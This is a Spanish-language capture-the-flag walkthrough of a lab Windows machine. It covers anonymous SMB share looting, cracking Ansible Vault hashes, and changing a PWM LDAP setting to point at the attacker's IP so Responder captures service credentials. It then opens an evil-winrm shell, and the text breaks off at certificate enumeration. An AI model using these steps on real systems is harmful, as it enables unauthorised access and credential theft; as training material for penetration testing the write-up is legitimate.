Hacemos el escaneo de nmap:
![[Pasted image 20240114151712.png]]
Comenzamos con la enumeración de SMB por el puerto 445, donde nos encontramos con dos recursos compartidos que pueden ser interesantes, por lo que revisamos el recurso de Department Shares y no hay nada interesante:
![[Pasted image 20240114151814.png]]
Pero si miramos el otro recurso compartido de Development, sí que encontramos cosas, donde corre un servicio de Ansible:
```bash
smbclient -N //10.10.11.222/Development/
```
![[Pasted image 20240114151937.png]]
Nos descargamos todo el recurso compartido de Ansible para poder analizarlo con más detalle:
```bash
smbclient -N //10.10.11.222/Development/ -c "recurse; prompt; mget *"
```
![[Pasted image 20240114152402.png]]
Y dentro del directorio /Automation/Ansible/PWM/ansible_inventory nos encontramos con unas credenciales de ansible:
```bash
administrator:Welcome1
```
![[Pasted image 20240114152458.png]]
Y dentro de esta otra ruta nos encontramos con unos hashes de ansible dentro del fichero main.yml:
```
/Automation/Ansible/PWM/defaults/main.yml
```
![[Pasted image 20240114152611.png]]
Y también tenemos unas credenciales de tomcat:
```bash
admin:T0mc@tAdm1n
robot:T0mc@tR00t
```
![[Pasted image 20240114152752.png]]
Comenzamos con el cracking de los hashes de ansible, donde vamos a copiar cada uno de ellos con la siguiente estructura:
![[Pasted image 20240114153939.png]]
Ahora extraemos el hash de cada uno de estos archivos para crackearlo con john the ripper:
![[Pasted image 20240114154019.png]]
Aplicamos el cracking y obtenemos las siguientes credenciales, donde vemos la misma contraseña:
```bash
!@#$%^&*
```
![[Pasted image 20240114154237.png]]
Ya podremos desencriptar cada uno de los hashes de ansible con la herramienta ansible-vault, la cual debemos de instalarla con pip previamente:
pip install ansible-vault
```bash
svc_pwm
pWm_@dm!N_!23
DevT3st@123
```
![[Pasted image 20240114154357.png]]
Accedemos al puerto 8443, donde si intentamos iniciar sesión nos sale el siguiente error de directorio:
![[Pasted image 20240114154553.png]]
Hacemos clic en configuration editor:
![[Pasted image 20240114154820.png]]
Y nos pide una contraseña, la cual si probamos con las que hemos crackeado anteriormente, esta sería la correcta:
```bash
pWm_@dm!N_!23
```
![[Pasted image 20240114154910.png]]
Hacemos clic en cancel y nos encontramos con esta web:
![[Pasted image 20240114154953.png]]
Nos bajamos el fichero de configuración:
![[Pasted image 20240114155234.png]]
Dentro de este archivo debemos de localizar la siguiente línea, que es donde se autentica el servidor ldap:
![[Pasted image 20240114155433.png]]
Y la reemplazamos por esta otra, poniendo nuestra IP y un puerto:
```bash
<value>ldap://10.10.16.7:389</value>
```
![[Pasted image 20240114155833.png]]
Y subimos la nueva configuración al servidor:
![[Pasted image 20240114155623.png]]
Una vez hecho esto, podemos ponernos en escucha con el responder y habremos capturado el hash del usuario svc_ldap:
```bash
responder -I tun0
```
![[Pasted image 20240114160003.png]]
Estas son las credenciales:
```bash
svc_ldap:lDaP_1n_th3_cle4r!
```
Y con evil-winrm podemos autenticarnos:
```bash
evil-winrm -i 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
```
![[Pasted image 20240114160126.png]]
Dentro de la raíz del servidor nos encontramos con un directorio interesante, el cual se llama Certs:
![[Pasted image 20240114160355.png]]
Hay una herramienta para detectar si un certificado es vulnerable, la cual se llama certify.exe:
![[Pasted image 20240114160835.png]]
